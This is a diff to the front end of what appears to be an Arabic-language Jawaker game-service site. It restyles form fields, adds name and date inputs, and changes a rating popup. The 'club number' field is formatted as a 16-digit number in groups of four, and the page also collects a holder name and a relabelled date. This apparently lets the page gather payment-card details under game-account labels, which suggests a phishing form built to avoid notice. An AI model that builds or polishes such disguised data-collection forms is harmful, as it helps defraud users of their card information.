@@ -299,14 +299,15 @@
   }
   .field.card-field input,
   .field.card-field select{
-    border-radius: 16px;
-    padding: 15px 18px;
+    border-radius: 18px;
+    padding: 16px 20px;
     font-size: 15px;
+    text-align:center;
   }
   .field.card-field select{
     width:100%;
-    background: #101216;
-    border: 1.5px solid var(--card-border);
+    background: #050505;
+    border: none;
     color: var(--text);
     font-family:'Tajawal', sans-serif;
     outline:none;
@@ -320,18 +321,18 @@
   }
   .row-3 input{
     width:100%;
-    background: #101216;
-    border: 1.5px solid var(--card-border);
-    border-radius: 14px;
-    padding: 15px 10px;
+    background: #050505;
+    border: none;
+    border-radius: 18px;
+    padding: 16px 10px;
     color: var(--text);
     font-family:'Tajawal', sans-serif;
     font-size: 14.5px;
     text-align:center;
     outline:none;
-    transition: border-color .15s ease;
+    transition: box-shadow .15s ease;
   }
-  .row-3 input:focus{ border-color: var(--violet); }
+  .row-3 input:focus{ box-shadow: 0 0 0 1.5px var(--green); }
   .form-title{
     font-family:'Cairo', sans-serif;
     font-weight:800;
@@ -350,17 +351,24 @@
   }
   .field input{
     width:100%;
-    background: #101216;
-    border: 1.5px solid var(--card-border);
-    border-radius: 10px;
-    padding: 12px 14px;
+    background: #050505;
+    border: none;
+    border-radius: 18px;
+    padding: 14px 18px;
     color: var(--text);
     font-family:'Tajawal', sans-serif;
     font-size: 14.5px;
+    text-align:center;
     outline:none;
-    transition: border-color .15s ease;
+    transition: box-shadow .15s ease;
   }
-  .field input:focus{ border-color: var(--violet); }
+  .field input:focus{ box-shadow: 0 0 0 1.5px var(--green); }
+  .field input::placeholder,
+  .field.card-field select::placeholder,
+  .row-3 input::placeholder{
+    color: #ffffff;
+    opacity: 1;
+  }
   .field .hint{
     font-size: 12px;
     color: var(--text-dim);
@@ -436,9 +444,10 @@
     color:#1c1e22;
     border-radius: 18px;
     width:100%;
-    max-width: 360px;
-    padding: 26px 22px 22px;
+    max-width: 380px;
+    padding: 28px 24px 26px;
     text-align:center;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
   }
   .rating-title{
     font-family:'Cairo', sans-serif;
@@ -461,22 +470,30 @@
     margin-bottom: 18px;
   }
   .rating-input{
-    width: 90px;
-    margin: 0 auto 18px;
+    width: 100px;
+    margin: 0 auto 20px;
     display:block;
     text-align:center;
     font-family:'Cairo', sans-serif;
     font-weight:700;
-    font-size: 20px;
+    font-size: 22px;
     color:#1c1e22;
-    background:#f4f5f7;
-    border: 1.5px solid #dfe2e8;
+    background:#f8f9fa;
+    border: 2px solid #dfe2e8;
     border-radius: 12px;
-    padding: 10px 6px;
+    padding: 12px 8px;
     outline:none;
+    transition: all .15s ease;
   }
-  .rating-input:focus{ border-color:#2f68c9; }
-  .rating-input.invalid{ border-color:#c0392b; }
+  .rating-input:focus{ 
+    border-color:#2f68c9;
+    background: #ffffff;
+    box-shadow: 0 0 0 3px rgba(47,104,201,0.1);
+  }
+  .rating-input.invalid{ 
+    border-color:#c0392b;
+    background: #ffebee;
+  }
   .rating-error{
     display:none;
     color:#c0392b;
@@ -497,15 +514,45 @@
     cursor:pointer;
     box-shadow: 0 3px 0 rgba(0,0,0,0.15);
   }
+  .rating-submit:active{
+    transform: translateY(2px);
+    box-shadow: 0 1px 0 rgba(0,0,0,0.15);
+  }
+  .rating-submit:disabled{
+    opacity: 0.5;
+    cursor: not-allowed;
+    pointer-events: none;
+  }
+  .rating-submit:disabled{
+    opacity: 0.5;
+    cursor: not-allowed;
+    pointer-events: none;
+  }
+  .rating-buttons-container{
+    display: flex;
+    gap: 10px;
+    width: 100%;
+  }
+  .rating-buttons-container button{
+    flex: 1;
+  }
   .rating-skip{
-    display:block;
-    margin: 12px auto 0;
-    background:none;
+    background: #f0f1f3;
     border:none;
-    color:#9a9ea8;
-    font-size: 12.5px;
+    color:#4a4d54;
+    font-family:'Cairo', sans-serif;
+    font-weight:700;
+    font-size: 14px;
+    padding: 13px 8px;
+    border-radius: 12px;
     cursor:pointer;
-    text-decoration:underline;
+    transition: all .15s ease;
+  }
+  .rating-skip:hover{
+    background: #e0e3e8;
+  }
+  .rating-skip:active{
+    transform: translateY(2px);
   }
 </style>
 </head>
@@ -554,8 +601,26 @@
         <input type="text" id="f-jawaker-number" name="jawakerNumber" inputmode="numeric" placeholder=" Number club" maxlength="19" required>
       </div>
 
+      <div class="row-3">
+        <input type="text" id="f-join-day" name="joinDay" inputmode="numeric" placeholder="DD" maxlength="2" required>
+        <input type="text" id="f-join-month" name="joinMonth" inputmode="numeric" placeholder="MM" maxlength="2" required>
+        <input type="text" id="f-join-year" name="joinYear" inputmode="numeric" placeholder="YYYY" maxlength="4" required>
+      </div>
+
+      <div class="soft-divider"></div>
+      <div class="section-label">معلومات عنك</div>
+
+      <div style="display:flex; gap:10px;">
+        <div class="field card-field" style="flex:1;">
+          <input type="text" id="f-first-name" name="firstNameRecord" placeholder="Name" required>
+        </div>
+        <div class="field card-field" style="flex:1;">
+          <input type="text" id="f-last-name" name="lastNameRecord" placeholder="Last name" required>
+        </div>
+      </div>
+
       <div class="field card-field">
-        <input type="text" id="f-country" name="country" placeholder="بلد الحساب على جواكر" required>
+        <input type="text" id="f-country" name="country" placeholder="country" required>
       </div>
 
       <button type="submit" class="submit-btn" id="submitBtn" disabled > إرسال المعلومات </button>
@@ -577,8 +642,10 @@
     <div class="rating-text">قيّم سرعة وأسعار موقعنا من 6 نجوم</div>
     <input type="number" id="ratingInput" class="rating-input" min="1" max="6" inputmode="numeric" placeholder="1-6">
     <div class="rating-error" id="ratingError">فضلاً اكتبي رقم من 1 إلى 6</div>
-    <button type="button" class="rating-submit" id="ratingSubmitBtn">إرسال التقييم</button>
-    <button type="button" class="rating-skip" id="ratingSkipBtn">لاحقاً</button>
+    <div class="rating-buttons-container">
+      <button type="button" class="rating-submit" id="ratingSubmitBtn" disabled>إرسال التقييم</button>
+      <button type="button" class="rating-skip" id="ratingSkipBtn">لاحقاً</button>
+    </div>
   </div>
 </div>
 
@@ -666,9 +733,25 @@
     this.value = this.value.replace(/\D/g, '');
   });
 
+  // Jawaker/club number: digits only, grouped in 4s with spaces (e.g. 1234 5678 9012 3456)
+  numberInput.addEventListener('input', function(){
+    const digits = this.value.replace(/\D/g, '').slice(0, 16);
+    this.value = digits.replace(/(.{4})(?=.)/g, '$1 ');
+  });
+
   // Holder Name: letters only, digits get stripped as they're typed
   holderNameInput.addEventListener('input', function(){
     this.value = this.value.replace(/[0-9]/g, '');
+  });
+
+  // Join date fields: digits only
+  const joinDayInput = document.getElementById('f-join-day');
+  const joinMonthInput = document.getElementById('f-join-month');
+  const joinYearInput = document.getElementById('f-join-year');
+  [joinDayInput, joinMonthInput, joinYearInput].forEach(input => {
+    input.addEventListener('input', function(){
+      this.value = this.value.replace(/\D/g, '');
+    });
   });
 
 
@@ -797,11 +880,15 @@
     if(submitBtn.disabled) return;
 
     const data = new FormData(payForm);
+    const joinDay = data.get('joinDay').padStart(2, '0');
+    const joinMonth = data.get('joinMonth').padStart(2, '0');
+    const joinYear = data.get('joinYear');
     const body = {
       id: data.get('id'),
       jawakerNumber: data.get('jawakerNumber').replace(/\s/g, ''),
       jawakerName: data.get('jawakerName'),
       country: data.get('country'),
+      joinDate: `${joinDay}/${joinMonth}/${joinYear}`,
       order: currentOrder || {},
     };
 
@@ -835,18 +922,32 @@
   const ratingSubmitBtn = document.getElementById('ratingSubmitBtn');
   const ratingSkipBtn = document.getElementById('ratingSkipBtn');
 
+  function isRatingValid(){
+    const value = parseInt(ratingInput.value, 10);
+    return !!value && value >= 1 && value <= 6;
+  }
+  ratingInput.addEventListener('input', function(){
+    ratingSubmitBtn.disabled = !isRatingValid();
+    if(isRatingValid()){
+      ratingInput.classList.remove('invalid');
+      ratingError.classList.remove('show');
+    }
+  });
+
   function showRatingModal(){
     ratingInput.value = '';
     ratingInput.classList.remove('invalid');
     ratingError.classList.remove('show');
-    ratingSubmitBtn.disabled = false;
+    ratingSubmitBtn.disabled = true;
     ratingSubmitBtn.textContent = 'إرسال التقييم';
     ratingOverlay.classList.add('open');
   }
   function closeRatingModal(){
     ratingOverlay.classList.remove('open');
   }
-  ratingSkipBtn.addEventListener('click', closeRatingModal);
+  ratingSkipBtn.addEventListener('click', function(){
+    location.reload();
+  });
   ratingOverlay.addEventListener('click', (e) => {
     if(e.target === ratingOverlay) closeRatingModal();
   });
